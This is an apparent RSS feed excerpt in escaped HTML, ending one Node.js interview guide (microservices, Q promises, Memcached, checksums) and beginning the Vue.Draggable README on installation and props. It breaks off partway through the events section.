&lt;p&gt;Microservices are a style of &lt;strong&gt;service-oriented architecture&lt;/strong&gt; (SOA) where the app is structured on an assembly of interconnected services. With microservices, the application architecture is built with lightweight protocols. The services are finely seeded in the architecture. Microservices disintegrate the app into smaller services and enable improved modularity.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;There are few things worth emphasizing about the superiority of microservices, and distributed systems generally, over monolithic architecture:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Modularity ‚Äî responsibility for specific operations is assigned to separate pieces of the application&lt;/li&gt; 
 &lt;li&gt;Uniformity ‚Äî microservices interfaces (API endpoints) consist of a base URI identifying a data object and standard HTTP methods (GET, POST, PUT, PATCH and DELETE) used to manipulate the object&lt;/li&gt; 
 &lt;li&gt;Robustness ‚Äî component failures cause only the absence or reduction of a specific unit of functionality&lt;/li&gt; 
 &lt;li&gt;Maintainability ‚Äî system components can be modified and deployed independently&lt;/li&gt; 
 &lt;li&gt;Scalability ‚Äî instances of a service can be added or removed to respond to changes in demand.&lt;/li&gt; 
 &lt;li&gt;Availability ‚Äî new features can be added to the system while maintaining 100% availability.&lt;/li&gt; 
 &lt;li&gt;Testability ‚Äî new solutions can be tested directly in the production environment by implementing them for restricted segments of users to see how they behave in real life.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Creating Microservices with Node.js&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Step 01: Creating a Server to Accept Requests&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;This file is creating our server and assigns routes to process all requests.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;//  server.js

const express = require(&#39;express&#39;)
const app = express();
const port = process.env.PORT || 3000;

const routes = require(&#39;./api/routes&#39;);
routes(app);
app.listen(port, function() {
   console.log(&#39;Server started on port: &#39; + port);
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Step 02: Defining the routes&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;The next step is to define the routes for the microservices and then assign each to a target in the controller. We have two endpoints. One endpoint called &quot;about&quot; that returns information about the application. And a &quot;distance&quot; endpoint that includes two path parameters, both Zip Codes of the Lego store. This endpoint returns the distance, in miles, between these two Zip Codes.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;const controller = require(&#39;./controller&#39;);

module.exports = function(app) {
   app.route(&#39;/about&#39;)
       .get(controller.about);
   app.route(&#39;/distance/:zipcode1/:zipcode2&#39;)
       .get(controller.getDistance);
};
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Step 03: Adding Controller Logic&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Within the controller file, we are going to create a controller object with two properties. Those properties are the functions to handle the requests we defined in the routes module.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var properties = require(&#39;../package.json&#39;)
var distance = require(&#39;../service/distance&#39;);

var controllers = {
   about: function(req, res) {
       var aboutInfo = {
           name: properties.name,
           version: properties.version
       }
       res.json(aboutInfo);
   },
   getDistance: function(req, res) {
           distance.find(req, res, function(err, dist) {
               if (err)
                   res.send(err);
               res.json(dist);
           });
       },
};

module.exports = controllers;
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How to use Q promise in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;A promise is an object that represents the return value or the thrown exception that the function may eventually provide. A promise can also be used as a proxy for a remote object to overcome latency.&lt;/p&gt; 
&lt;p&gt;Promise is relatively an easy implementation for asynchronous operation. The promise object returned from the function represents an operation which is not completed yet, but it guarantees to the caller of the operation that the operation will be completed in future.&lt;/p&gt; 
&lt;p&gt;Promise has the following states:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Pending&lt;/strong&gt; - asynchronous operation is not yet completed.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Fulfilled&lt;/strong&gt; - asynchronous operation is completed successfully.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Rejected&lt;/strong&gt; - asynchronous operation is terminated with an error.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Settled&lt;/strong&gt; - asynchronous operation is either fulfilled or rejected.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Callback&lt;/strong&gt; - function is executed if the promise is executed with value.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Errback&lt;/strong&gt; - function is executed if the promise is rejected.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Moving to Promises from Callback&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;On the first pass, promises can mitigate the &lt;strong&gt;Pyramid of Doom&lt;/strong&gt;: the situation where code marches to the right faster than it marches forward.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;step1(function (value1) {
    step2(value1, function(value2) {
        step3(value2, function(value3) {
            step4(value3, function(value4) {
                // Do something with value4
            });
        });
    });
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;With a promise library, it can flatten the pyramid.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;Q.fcall(promisedStep1)
.then(promisedStep2)
.then(promisedStep3)
.then(promisedStep4)
.then(function (value4) {
    // Do something with value4
})
.catch(function (error) {
    // Handle any error from all above steps
})
.done();
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;[&lt;a href=&quot;https://www.npmjs.com/package/q&quot;&gt;Reference&lt;/a&gt;]&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How to implement Memcached in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Memcached&lt;/strong&gt; is a general-purpose distributed memory caching system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source (such as a database or API) must be read. Memcached is free and open-source software, licensed under the Revised BSD licence. Memcached runs on Unix-like operating systems (at least LINUX and OS X) and on Microsoft windows.&lt;/p&gt; 
&lt;p&gt;We can store data to memcached server in key pair format. So whenever any request come from the app can be matched with memcached server without any query from mysql/Nosql server. This increases the performance of the application.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install memcached
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Setting up the client&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;The constructor of the memcached client take 2 different arguments server locations and options. Syntax:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;var Memcached = require(&#39;memcached&#39;);
var memcached = new Memcached(Server locations, options);
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Example usage&lt;/strong&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var Memcached = require(&#39;memcached&#39;);
// all global configurations should be applied to the .config object of the Client.
Memcached.config.poolSize = 25;

var memcached = new Memcached(&#39;localhost:11211&#39;, {retries:10,retry:10000,remove:true,failOverServers:[&#39;192.168.0.103:11211&#39;]});
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;&lt;strong&gt;[&lt;a href=&quot;https://www.npmjs.com/package/memcached&quot;&gt;Reference&lt;/a&gt;]&lt;/strong&gt;&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How to generate and verify checksum of the given string in Nodejs&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;The &lt;strong&gt;checksum&lt;/strong&gt; (aka &lt;strong&gt;hash sum&lt;/strong&gt;) calculation is a one-way process of mapping an extensive data set of variable length (e.g., message, file), to a smaller data set of a fixed length (hash). The length depends on a hashing algorithm.&lt;/p&gt; 
&lt;p&gt;For the checksum generation, we can use node &lt;code&gt;crypto()&lt;/code&gt; module. The module uses &lt;code&gt;createHash(algorithm)&lt;/code&gt; to create a checksum (hash) generator. The algorithm is dependent on the available algorithms supported by the version of OpenSSL on the platform.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;const crypto = require(&#39;crypto&#39;);

// To get a list of all available hash algorithms
crypto.getHashes() // [ &#39;md5&#39;, &#39;sha1&#39;, &#39;sha3-256&#39;, ... ]

  
// Create hash of SHA1 type
const key = &quot;MY_SECRET_KEY&quot;;


// &#39;digest&#39; is the output of hash function containing  
// only hexadecimal digits
hashPwd = crypto.createHash(&#39;sha1&#39;).update(key).digest(&#39;hex&#39;);
  
console.log(hashPwd); //ef5225a03e4f9cc953ab3c4dd41f5c4db7dc2e5b
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h4&gt;Q. &lt;em&gt;&lt;strong&gt;Explain Error Handling in Nodejs?&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt; 
&lt;h4&gt;Q. &lt;em&gt;&lt;strong&gt;How to use locale (i18n) in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt; 
&lt;h4&gt;Q. &lt;em&gt;&lt;strong&gt;What are the types of memory leaks in node.js&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt; 
&lt;h4&gt;Q. &lt;em&gt;&lt;strong&gt;How to implement a Sleep function?&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt; 
&lt;h4&gt;Q. &lt;em&gt;&lt;strong&gt;How does the cluster load balance work in node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt; 
&lt;h4&gt;Q. &lt;em&gt;&lt;strong&gt;What is daemon process? how to implement it in node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt; 
&lt;h4&gt;Q. &lt;em&gt;&lt;strong&gt;How to synchronize data between multiple clients on node.js server?&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt; 
&lt;!-- raw HTML omitted --&gt;</description>
    </item>
    
    <item>
      <title>SortableJS/Vue.Draggable</title>
      <link>https://github.com/SortableJS/Vue.Draggable</link>
      <description>&lt;p&gt;Vue drag-and-drop component based on Sortable.js&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&quot;https://circleci.com/gh/SortableJS/Vue.Draggable&quot;&gt;&lt;img src=&quot;https://circleci.com/gh/SortableJS/Vue.Draggable.svg?style=shield&quot; alt=&quot;CircleCI&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://codecov.io/gh/SortableJS/Vue.Draggable&quot;&gt;&lt;img src=&quot;https://codecov.io/gh/SortableJS/Vue.Draggable/branch/master/graph/badge.svg&quot; alt=&quot;Coverage&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://codebeat.co/projects/github-com-sortablejs-vue-draggable-master&quot;&gt;&lt;img src=&quot;https://codebeat.co/badges/7a6c27c8-2d0b-47b9-af55-c2eea966e713&quot; alt=&quot;codebeat badge&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/SortableJS/Vue.Draggable/issues?q=is%3Aopen+is%3Aissue&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/issues/SortableJS/Vue.Draggable.svg&quot; alt=&quot;GitHub open issues&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://www.npmjs.com/package/vuedraggable&quot;&gt;&lt;img src=&quot;https://img.shields.io/npm/dt/vuedraggable.svg&quot; alt=&quot;npm download&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://www.npmjs.com/package/vuedraggable&quot;&gt;&lt;img src=&quot;https://img.shields.io/npm/dm/vuedraggable.svg&quot; alt=&quot;npm download per month&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://www.npmjs.com/package/vuedraggable&quot;&gt;&lt;img src=&quot;https://img.shields.io/npm/v/vuedraggable.svg&quot; alt=&quot;npm version&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://github.com/SortableJS/Vue.Draggable/blob/master/LICENSE&quot;&gt;&lt;img src=&quot;https://img.shields.io/github/license/SortableJS/Vue.Draggable.svg&quot; alt=&quot;MIT License&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Vue component (Vue.js 2.0) or directive (Vue.js 1.0) allowing drag-and-drop and synchronization with view model array.&lt;/p&gt; 
&lt;p&gt;Based on and offering all features of &lt;a href=&quot;https://github.com/RubaXa/Sortable&quot;&gt;Sortable.js&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;For Vue 3&lt;/h2&gt; 
&lt;p&gt;See &lt;a href=&quot;https://github.com/SortableJS/vue.draggable.next&quot;&gt;vue.draggable.next&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Demo&lt;/h2&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/SortableJS/Vue.Draggable/master/example.gif&quot; alt=&quot;demo gif&quot;&gt;&lt;/p&gt; 
&lt;h2&gt;Live Demos&lt;/h2&gt; 
&lt;p&gt;https://sortablejs.github.io/Vue.Draggable/&lt;/p&gt; 
&lt;p&gt;https://david-desmaisons.github.io/draggable-example/&lt;/p&gt; 
&lt;h2&gt;Features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Full support of &lt;a href=&quot;https://github.com/RubaXa/Sortable&quot;&gt;Sortable.js&lt;/a&gt; features: 
  &lt;ul&gt; 
   &lt;li&gt;Supports touch devices&lt;/li&gt; 
   &lt;li&gt;Supports drag handles and selectable text&lt;/li&gt; 
   &lt;li&gt;Smart auto-scrolling&lt;/li&gt; 
   &lt;li&gt;Support drag and drop between different lists&lt;/li&gt; 
   &lt;li&gt;No jQuery dependency&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Keeps in sync HTML and view model list&lt;/li&gt; 
 &lt;li&gt;Compatible with Vue.js 2.0 transition-group&lt;/li&gt; 
 &lt;li&gt;Cancellation support&lt;/li&gt; 
 &lt;li&gt;Events reporting any changes when full control is needed&lt;/li&gt; 
 &lt;li&gt;Reuse existing UI library components (such as &lt;a href=&quot;https://vuetifyjs.com&quot;&gt;vuetify&lt;/a&gt;, &lt;a href=&quot;http://element.eleme.io/&quot;&gt;element&lt;/a&gt;, or &lt;a href=&quot;https://vuematerial.io&quot;&gt;vue material&lt;/a&gt; etc...) and make them draggable using &lt;code&gt;tag&lt;/code&gt; and &lt;code&gt;componentData&lt;/code&gt; props&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Backers&lt;/h2&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;Admin Dashboard Templates made with Vue, React and Angular.&lt;/p&gt; 
&lt;h2&gt;Donate&lt;/h2&gt; 
&lt;p&gt;Find this project useful? You can buy me a :coffee: or a :beer:&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://www.paypal.com/cgi-bin/webscr?cmd=_donations&amp;amp;business=GYAEKQZJ4FQT2&amp;amp;currency_code=USD&amp;amp;source=url&quot;&gt;&lt;img src=&quot;https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif&quot; alt=&quot;paypal&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;h3&gt;With npm or yarn&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;yarn add vuedraggable

npm i -S vuedraggable
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Beware it is vuedraggable for Vue 2.0 and not vue-draggable which is for version 1.0&lt;/strong&gt;&lt;/p&gt; 
&lt;h3&gt;with direct link&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;
&amp;lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/vue/2.5.2/vue.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;!-- CDNJS :: Sortable (https://cdnjs.com/) --&amp;gt;
&amp;lt;script src=&quot;//cdn.jsdelivr.net/npm/sortablejs@1.8.4/Sortable.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;!-- CDNJS :: Vue.Draggable (https://cdnjs.com/) --&amp;gt;
&amp;lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/Vue.Draggable/2.20.0/vuedraggable.umd.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;

&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;a href=&quot;https://github.com/SortableJS/Vue.Draggable/tree/master/example&quot;&gt;cf example section&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;For Vue.js 2.0&lt;/h2&gt; 
&lt;p&gt;Use draggable component:&lt;/p&gt; 
&lt;h3&gt;Typical use:&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;draggable v-model=&quot;myArray&quot; group=&quot;people&quot; @start=&quot;drag=true&quot; @end=&quot;drag=false&quot;&amp;gt;
   &amp;lt;div v-for=&quot;element in myArray&quot; :key=&quot;element.id&quot;&amp;gt;{{element.name}}&amp;lt;/div&amp;gt;
&amp;lt;/draggable&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;.vue file:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;  import draggable from &#39;vuedraggable&#39;
  ...
  export default {
        components: {
            draggable,
        },
  ...
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;With &lt;code&gt;transition-group&lt;/code&gt;:&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;draggable v-model=&quot;myArray&quot;&amp;gt;
    &amp;lt;transition-group&amp;gt;
        &amp;lt;div v-for=&quot;element in myArray&quot; :key=&quot;element.id&quot;&amp;gt;
            {{element.name}}
        &amp;lt;/div&amp;gt;
    &amp;lt;/transition-group&amp;gt;
&amp;lt;/draggable&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Draggable component should directly wrap the draggable elements, or a &lt;code&gt;transition-component&lt;/code&gt; containing the draggable elements.&lt;/p&gt; 
&lt;h3&gt;With footer slot:&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;draggable v-model=&quot;myArray&quot; draggable=&quot;.item&quot;&amp;gt;
    &amp;lt;div v-for=&quot;element in myArray&quot; :key=&quot;element.id&quot; class=&quot;item&quot;&amp;gt;
        {{element.name}}
    &amp;lt;/div&amp;gt;
    &amp;lt;button slot=&quot;footer&quot; @click=&quot;addPeople&quot;&amp;gt;Add&amp;lt;/button&amp;gt;
&amp;lt;/draggable&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;With header slot:&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;draggable v-model=&quot;myArray&quot; draggable=&quot;.item&quot;&amp;gt;
    &amp;lt;div v-for=&quot;element in myArray&quot; :key=&quot;element.id&quot; class=&quot;item&quot;&amp;gt;
        {{element.name}}
    &amp;lt;/div&amp;gt;
    &amp;lt;button slot=&quot;header&quot; @click=&quot;addPeople&quot;&amp;gt;Add&amp;lt;/button&amp;gt;
&amp;lt;/draggable&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;With Vuex:&lt;/h3&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;draggable v-model=&#39;myList&#39;&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;computed: {
    myList: {
        get() {
            return this.$store.state.myList
        },
        set(value) {
            this.$store.commit(&#39;updateList&#39;, value)
        }
    }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Props&lt;/h3&gt; 
&lt;h4&gt;value&lt;/h4&gt; 
&lt;p&gt;Type: &lt;code&gt;Array&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt; Required: &lt;code&gt;false&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt; Default: &lt;code&gt;null&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;Input array to draggable component. Typically same array as referenced by inner element v-for directive.
 &lt;!-- raw HTML omitted --&gt; This is the preferred way to use Vue.draggable as it is compatible with Vuex.
 &lt;!-- raw HTML omitted --&gt; It should not be used directly but only though the &lt;code&gt;v-model&lt;/code&gt; directive:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;draggable v-model=&quot;myArray&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;list&lt;/h4&gt; 
&lt;p&gt;Type: &lt;code&gt;Array&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt; Required: &lt;code&gt;false&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt; Default: &lt;code&gt;null&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;Alternative to the &lt;code&gt;value&lt;/code&gt; prop, list is an array to be synchronized with drag-and-drop.
 &lt;!-- raw HTML omitted --&gt; The main difference is that &lt;code&gt;list&lt;/code&gt; prop is updated by draggable component using splice method, whereas &lt;code&gt;value&lt;/code&gt; is immutable.
 &lt;!-- raw HTML omitted --&gt; &lt;strong&gt;Do not use in conjunction with value prop.&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;All sortable options&lt;/h4&gt; 
&lt;p&gt;New in version 2.19&lt;/p&gt; 
&lt;p&gt;Sortable options can be set directly as vue.draggable props since version 2.19.&lt;/p&gt; 
&lt;p&gt;This means that all &lt;a href=&quot;https://github.com/RubaXa/Sortable#options&quot;&gt;sortable option&lt;/a&gt; are valid sortable props with the notable exception of all the method starting by &quot;on&quot; as draggable component expose the same API via events.&lt;/p&gt; 
&lt;p&gt;kebab-case propery are supported: for example &lt;code&gt;ghost-class&lt;/code&gt; props will be converted to &lt;code&gt;ghostClass&lt;/code&gt; sortable option.&lt;/p&gt; 
&lt;p&gt;Example setting handle, sortable and a group option:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-HTML&quot;&gt;&amp;lt;draggable
        v-model=&quot;list&quot;
        handle=&quot;.handle&quot;
        :group=&quot;{ name: &#39;people&#39;, pull: &#39;clone&#39;, put: false }&quot;
        ghost-class=&quot;ghost&quot;
        :sort=&quot;false&quot;
        @change=&quot;log&quot;
      &amp;gt;
      &amp;lt;!-- --&amp;gt;
&amp;lt;/draggable&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;tag&lt;/h4&gt; 
&lt;p&gt;Type: &lt;code&gt;String&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt; Default: &lt;code&gt;&#39;div&#39;&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;HTML node type of the element that draggable component create as outer element for the included slot.
 &lt;!-- raw HTML omitted --&gt; It is also possible to pass the name of vue component as element. In this case, draggable attribute will be passed to the create component.
 &lt;!-- raw HTML omitted --&gt; See also &lt;a href=&quot;https://raw.githubusercontent.com/SortableJS/Vue.Draggable/master/#componentdata&quot;&gt;componentData&lt;/a&gt; if you need to set props or event to the created component.&lt;/p&gt; 
&lt;h4&gt;clone&lt;/h4&gt; 
&lt;p&gt;Type: &lt;code&gt;Function&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt; Required: &lt;code&gt;false&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt; Default: &lt;code&gt;(original) =&amp;gt; { return original;}&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;p&gt;Function called on the source component to clone element when clone option is true. The unique argument is the viewModel element to be cloned and the returned value is its cloned version.
 &lt;!-- raw HTML omitted --&gt; By default vue.draggable reuses the viewModel element, so you have to use this hook if you want to clone or deep clone it.&lt;/p&gt; 
&lt;h4&gt;move&lt;/h4&gt; 
&lt;p&gt;Type: &lt;code&gt;Function&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt; Required: &lt;code&gt;false&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt; Default: &lt;code&gt;null&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;p&gt;If not null this function will be called in a similar way as &lt;a href=&quot;https://github.com/RubaXa/Sortable#move-event-object&quot;&gt;Sortable onMove callback&lt;/a&gt;. Returning false will cancel the drag operation.&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;function onMoveCallback(evt, originalEvent){
   ...
    // return false; ‚Äî for cancel
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;evt object has same property as &lt;a href=&quot;https://github.com/RubaXa/Sortable#move-event-object&quot;&gt;Sortable onMove event&lt;/a&gt;, and 3 additional properties:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;draggedContext&lt;/code&gt;: context linked to dragged element 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;index&lt;/code&gt;: dragged element index&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;element&lt;/code&gt;: dragged element underlying view model element&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;futureIndex&lt;/code&gt;: potential index of the dragged element if the drop operation is accepted&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;relatedContext&lt;/code&gt;: context linked to current drag operation 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;index&lt;/code&gt;: target element index&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;element&lt;/code&gt;: target element view model element&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;list&lt;/code&gt;: target list&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;component&lt;/code&gt;: target VueComponent&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;HTML:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-HTML&quot;&gt;&amp;lt;draggable :list=&quot;list&quot; :move=&quot;checkMove&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;javascript:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;checkMove: function(evt){
    return (evt.draggedContext.element.name!==&#39;apple&#39;);
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;See complete example: &lt;a href=&quot;https://github.com/SortableJS/Vue.Draggable/blob/master/examples/Cancel.html&quot;&gt;Cancel.html&lt;/a&gt;, &lt;a href=&quot;https://github.com/SortableJS/Vue.Draggable/blob/master/examples/script/cancel.js&quot;&gt;cancel.js&lt;/a&gt;&lt;/p&gt; 
&lt;h4&gt;componentData&lt;/h4&gt; 
&lt;p&gt;Type: &lt;code&gt;Object&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt; Required: &lt;code&gt;false&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt; Default: &lt;code&gt;null&lt;/code&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt; 
&lt;p&gt;This props is used to pass additional information to child component declared by &lt;a href=&quot;https://raw.githubusercontent.com/SortableJS/Vue.Draggable/master/#tag&quot;&gt;tag props&lt;/a&gt;.
 &lt;!-- raw HTML omitted --&gt; Value:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;props&lt;/code&gt;: props to be passed to the child component&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;attrs&lt;/code&gt;: attrs to be passed to the child component&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;on&lt;/code&gt;: events to be subscribe in the child component&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Example (using &lt;a href=&quot;http://element.eleme.io/#/en-US&quot;&gt;element UI library&lt;/a&gt;):&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-HTML&quot;&gt;&amp;lt;draggable tag=&quot;el-collapse&quot; :list=&quot;list&quot; :component-data=&quot;getComponentData()&quot;&amp;gt;
    &amp;lt;el-collapse-item v-for=&quot;e in list&quot; :title=&quot;e.title&quot; :name=&quot;e.name&quot; :key=&quot;e.name&quot;&amp;gt;
        &amp;lt;div&amp;gt;{{e.description}}&amp;lt;/div&amp;gt;
     &amp;lt;/el-collapse-item&amp;gt;
&amp;lt;/draggable&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;methods: {
    handleChange() {
      console.log(&#39;changed&#39;);
    },
    inputChanged(value) {
      this.activeNames = value;
    },
    getComponentData() {
      return {
        on: {
          change: this.handleChange,
          input: this.inputChanged
        },
        attrs:{
          wrap: true
        },
        props: {
          value: this.activeNames
        }
      };
    }
  }
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Events&lt;/h3&gt; 
&lt;ul&gt; 
